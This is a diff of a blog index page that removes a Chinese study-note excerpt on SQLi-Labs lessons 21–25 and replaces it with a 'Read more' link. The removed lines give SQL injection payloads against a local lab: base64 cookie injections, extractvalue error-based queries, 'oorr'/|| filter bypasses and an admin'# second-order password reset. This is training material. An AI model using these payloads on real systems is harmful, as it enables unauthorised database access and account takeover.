@@ -386,54 +386,17 @@
 
       
         
-          
-            <h5 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h5><blockquote>
+          <h5 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h5><blockquote>
 <p>single/double quotes 单/双引号；comment 这里指的是注释符号#和–；parenthesis 圆括号</p>
 <p>HTTP数据包传输过程中Cookie字段的特殊符号会被urlencode；</p>
 </blockquote>
-<h5 id="Lesson-21-cookie注入-–-基于错误-–-单引号-amp-圆括号"><a href="#Lesson-21-cookie注入-–-基于错误-–-单引号-amp-圆括号" class="headerlink" title="Lesson-21 cookie注入 – 基于错误 – 单引号&amp;圆括号"></a>Lesson-21 cookie注入 – 基于错误 – 单引号&amp;圆括号</h5><p>与Lesson-20类似，把Cookie编码中的playload做Base64编码即可。</p>
-<blockquote>
-<p>手注：</p>
-<p>// ‘) union select database(),user(),version() # 进行base64编码</p>
-<p>JykgdW5pb24gc2VsZWN0IGRhdGFiYXNlKCksdXNlcigpLHZlcnNpb24oKSAj</p>
-<p>SQLMap：测不出有注入！！！</p>
-</blockquote>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fzgcrhz8cuj31ax0u049i.jpg" alt=""></p>
-<h5 id="Lesson-22-cookie注入-–-基于错误-双引号"><a href="#Lesson-22-cookie注入-–-基于错误-双引号" class="headerlink" title="Lesson-22 cookie注入 – 基于错误 - 双引号"></a>Lesson-22 cookie注入 – 基于错误 - 双引号</h5><p>与Lesson-20类似，这里基于双引号而已。</p>
-<blockquote>
-<p>// admin1” and extractvalue(1,concat(0x7e,(select database()),0x7e)) #</p>
-<p>YWRtaW4xIiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkgIw==</p>
-</blockquote>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fzgd0og9b9j31el0u012q.jpg" alt=""></p>
-<h5 id="Lesson-23-GET-基于错误-–-过滤注释符"><a href="#Lesson-23-GET-基于错误-–-过滤注释符" class="headerlink" title="Lesson-23 GET - 基于错误 – 过滤注释符"></a>Lesson-23 GET - 基于错误 – 过滤注释符</h5><p>1、id=-1，为什么要用-1，因为 sql 语句执行了两个 select 语句，第一个 select 为 id 的选择语<br>句，第二个为我们构造的 select 语句。只有一个数据可以输出，为了让我们自己构造的数据<br>可以正常输出，第一个 select 要没有结果，所以-1 或者超过数据库所有数据都可以。<br>2、-1’ union select 1,@@datadir,3’ 第一个单引号闭合-1，第二个单引号闭合后面<br>的。这样将查询内容显示在 username 处。<br>3、此处可以报错注入、延时盲注、Boolean盲注。</p>
-<blockquote>
-<p><a href="http://127.0.0.1:8088/Less-23/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-23/?id=-1&#39;</a> union select 1,@@datadir,3 ‘</p>
-</blockquote>
-<h5 id="Lesson-24-POST-二次排序注入-存储型注入"><a href="#Lesson-24-POST-二次排序注入-存储型注入" class="headerlink" title="Lesson-24 POST - 二次排序注入/存储型注入"></a>Lesson-24 POST - 二次排序注入/存储型注入</h5><p>此例子中我们的步骤是注册一个 admin’#的账号，接下来登录该帐号后进行修改密码。此时<br>修改的就是 admin 的密码。</p>
-<h5 id="Lesson-25-GET-过滤and和or"><a href="#Lesson-25-GET-过滤and和or" class="headerlink" title="Lesson-25 GET - 过滤and和or"></a>Lesson-25 GET - 过滤and和or</h5><p>如何绕过or和and过滤。一般性提供以下几种思路：</p>
-<ol>
-<li>大小写变形：Or,OR,oR</li>
-<li>双写绕过：oorr ✅</li>
-<li>编码：hex，urlencode ❎</li>
-<li>添加注释：/**/ ❎</li>
-<li>利用符号：and=&amp;&amp; or=||</li>
-</ol>
-<blockquote>
-<p><a href="http://127.0.0.1:8088/Less-25/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-25/?id=1&#39;</a> oorr extractvalue(1,concat(0x7e,database())) %23</p>
-<p><a href="http://127.0.0.1:8088/Less-25/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-25/?id=1&#39;</a> || extractvalue(1,concat(0x7e,database())) %23</p>
-</blockquote>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fzgmbrmo61j31be0aswfv.jpg" alt=""></p>
-<h5 id="Lesson-25a-GET-过滤and和or关闭报错回显"><a href="#Lesson-25a-GET-过滤and和or关闭报错回显" class="headerlink" title="Lesson-25a GET - 过滤and和or关闭报错回显"></a>Lesson-25a GET - 过滤and和or关闭报错回显</h5><p>我们可以看到SQL执行语句为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>这里的id传入的参数在SQL语句中并没有用单引号来包裹，同时在源代码中注释了print_r(mysql_error());所以无法使用报错注入，在这里我们沿用25关的绕过方式，对于注入方法我们可以使用延时注入或者联合查询、布尔注入等。</p>
-<blockquote>
-<p><a href="http://127.0.0.1:8088/Less-25a/?id=-1" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-25a/?id=-1</a> union select 1,user(),3#</p>
-<p>//1=1 1=2</p>
-<p><a href="http://127.0.0.1:8088/Less-25a/?id=-1" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-25a/?id=-1</a> || 1=1 –+</p>
-</blockquote>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fzgn9cvh3tj319u0bsabe.jpg" alt=""></p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/01/22/SQLi-Labs学习笔记21-25/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
